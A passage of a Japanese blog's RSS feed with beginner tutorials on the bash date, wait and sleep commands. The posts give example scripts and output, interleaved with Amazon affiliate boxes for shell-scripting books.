&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２８．dateコマンド】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-28-suzuki/shellscript.jpg" alt="Featured image of post 【２８．dateコマンド】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="dateコマンド">dateコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>現在の日付を解析する：&lt;/b>&lt;/font>&lt;br>
dateコマンドを使用して、現在のシステムの日付と時刻の値を取得することができます。日付と時刻は、「Y」、「m」、「d」、「H」、「M」、および「S」を使用します。&amp;lsquo;date_parse.sh&amp;rsquo;という名前の新しいファイルを作成し、次のコードを追加して、日、月、年、時、分、秒の値を表示します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:date_parse.sh" data-lang="bash:date_parse.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">Year&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%Y&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Month&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%m&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Day&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%d&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Hour&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%H&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Minute&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%M&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">Second&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%S&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="sb">`&lt;/span>date&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Current Date is: &lt;/span>&lt;span class="nv">$Day&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$Month&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$Year&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Current Time is: &lt;/span>&lt;span class="nv">$Hour&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="nv">$Minute&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="nv">$Second&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash date_parse.sh
2022年 1月13日 木曜日 12時19分06秒 JST
Current Date is: 13-01-2022
Current Time is: 12:19:06
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>dateコマンドは覚えるのではなく、manコマンドで都度、探しましょう。きりがないです。できる事を覚えておけばオッケーです。以下にありきたりなパターンを列挙しておきます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code>$ date '+%Y/%m/%d'
2005/09/11
$ date '+%Y/%m/%d(%a)'
2005/09/11(Sun)
$ date '+%y/%m/%d'
05/09/11
$ date '+%F'
2005-09-11
$ date '+%D'
09/11/05
$ date '+%R'
01:18
$ date '+%T'
01:18:01
$ date '+%r'
01:18:06 AM
$ date '+%Y/%m/%d%n%r'
2005/09/11
01:18:27 AM
#↑%n を使用することで、出力に改行を含めることができる。
# 1日後
$ date -d '1 day'
# 2日後
$ date -d '2 days
# 1日前
$ date -d '1 day ago'
# 1ヶ月前
$ date -d '1 month ago'
# 1年前
$ date -d '1 year ago'
# 1時間前
$ date -d '1 hour ago'
# 1分前
$ date -d '1 minute ago'
# 1秒前
$ date -d '1 second ago'
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-:直近5分以内にあるerrorログを表示" data-lang=":直近5分以内にあるerrorログを表示">$ IFSBK=${IFS} ; IFS=$'\n' ; for record in $(cat /var/log/messages ) ; do if [ $(( $(date +&amp;quot;%s&amp;quot;) - 300 )) -lt $(echo ${record} | cut -d&amp;quot; &amp;quot; -f 1,2,3 | date --date=&amp;quot;$(cat -)&amp;quot; +&amp;quot;%s&amp;quot;) ] ; then echo ${record} ; fi ; done | grep error ; IFS=${IFSBK}
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２９．waitコマンド】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-29-suzuki/shellscript.jpg" alt="Featured image of post 【２９．waitコマンド】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="waitコマンド">waitコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>waitコマンド：&lt;/b>&lt;/font>&lt;br>
waitコマンドは、実行中のプロセスの完了を待機するLinuxの組み込みコマンドです。 waitコマンドは、特定のプロセスIDまたはジョブIDで使用されます。waitコマンドでプロセスIDまたはジョブIDが指定されていない場合、現在のすべての子プロセスが完了するのを待機し、終了ステータスを返します。' wait_example.sh&amp;rsquo;という名前のファイルを作成し、次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:wait_example.sh" data-lang="bash:wait_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Wait command&amp;#34;&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;span class="nv">process_id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$!&lt;/span>
&lt;span class="nb">wait&lt;/span> &lt;span class="nv">$process_id&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Exited with status &lt;/span>&lt;span class="nv">$?&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash wait_example.sh
Wait command
Exited with status 0
$
&lt;/code>&lt;/pre>&lt;p>わかりにくいですね。&lt;br>
もう少しわかりやすく説明します。&lt;br>
waitコマンドは、他のプロセスの終了まで待機することができるコマンドです。&lt;br>
例えば、以下三つのファイルを実行します。&lt;br>
末尾に &amp;amp; がついているのは、それぞれの実行ファイルをバックグラウンドで並列で実行させることを意味しています。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
bash a.sh &lt;span class="p">&amp;amp;;&lt;/span>
bash b.sh &lt;span class="p">&amp;amp;;&lt;/span>
bash c.sh &lt;span class="p">&amp;amp;;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>では、三つの実行ファイルが全て完了したらコメントを出力するソースに書き直してみます。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:間違ったソース" data-lang="bash:間違ったソース">#!/bin/bash
bash a.sh &amp;amp;;
bash b.sh &amp;amp;;
bash c.sh &amp;amp;;
echo &amp;quot;終了しました&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>上記のソースは、実行の終了を待たずに「終了しました」が出力されます。要するに、コメントの出力は全ての実行を待っていない訳です。正しいソースに書き直してみます。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:正しいソース" data-lang="bash:正しいソース">#!/bin/bash
bash a.sh &amp;amp;;
bash b.sh &amp;amp;;
bash c.sh &amp;amp;;
wait;
echo &amp;quot;終了しました&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>上記のようにwaitコマンドを挟むことで、a.sh, b.sh, c.sh の実行が終了してから完了メッセージを表示させることが出来ました。&lt;/p>
&lt;p>前の処理終了を待ってから、次の処理を実行する方法は以下の通りです。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:処理の終了を待って次の処理へ" data-lang="bash:処理の終了を待って次の処理へ">#!/bin/bash
command1 &amp;amp;
command2 &amp;amp;
wait
command3
&lt;/code>&lt;/pre>&lt;p>上記の様にすると、command1とcommand2が終了してからcommand3が実行される様にできます。command1と2がバックグラウンドで実行され、waitコマンドで処理終了まで待機し、command3が実行されるといった流れです。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>waitコマンドと似ているsleepコマンドについて、次の章で説明します。またsleepコマンドとwaitコマンドを組み合わせて並列処理を行うサンプルも次の章で示します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【３０．sleepコマンド】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-30-suzuki/shellscript.jpg" alt="Featured image of post 【３０．sleepコマンド】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="sleepコマンド">sleepコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>sleepコマンド：&lt;/b>&lt;/font>&lt;br>
コマンドの実行を特定の期間一時停止する場合は、sleepコマンドを使用できます。遅延量は、 秒（s）、分（m）、時間（h）、および日（d）で設定できます。&amp;lsquo;sleep_example.sh&amp;rsquo; という名前のファイルを作成し、次のスクリプトを追加します。このスクリプトは、実行後5秒間待機します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:sleep_example.sh" data-lang="bash:sleep_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> “Wait &lt;span class="k">for&lt;/span> &lt;span class="m">5&lt;/span> seconds”
sleep &lt;span class="m">5&lt;/span>
&lt;span class="nb">echo&lt;/span> “Completed”
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash sleep_example.sh
“Wait for 5 seconds”
“Completed”
$
&lt;/code>&lt;/pre>&lt;p>わかりにくいですね。&lt;br>
少し高度だけど、わかりやすいサンプルも書いておきます。&lt;/p>
&lt;h1 id="wait-コマンドのサンプル">wait コマンドのサンプル&lt;/h1>
&lt;p>sleep コマンドをバックグラウンドで実行させ、前の章で使ったwait コマンドで同期をとります。。バックグランドで実行したコマンドのプロセス ID は $! で取得できます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:wait_example.sh" data-lang="bash:wait_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="o">((&lt;/span>&lt;span class="nv">i&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="p">;&lt;/span>i&amp;lt;3&lt;span class="p">;&lt;/span>i++&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">do&lt;/span>
sleep &lt;span class="m">5&lt;/span> &lt;span class="p">&amp;amp;;&lt;/span>
array&lt;span class="o">[&lt;/span>i&lt;span class="o">]=&lt;/span>&lt;span class="nv">$!&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Sleeping: &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">i&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> : &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">array&lt;/span>&lt;span class="p">[i]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="nb">wait&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">array&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Finish!!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>二つのコマンドの違いは以下の通りです。&lt;/dd>
&lt;dd>sleepは指定した時間だけ処理を遅延&lt;/dd>
&lt;dd>waitはプロセスやジョブの終了を待つ&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
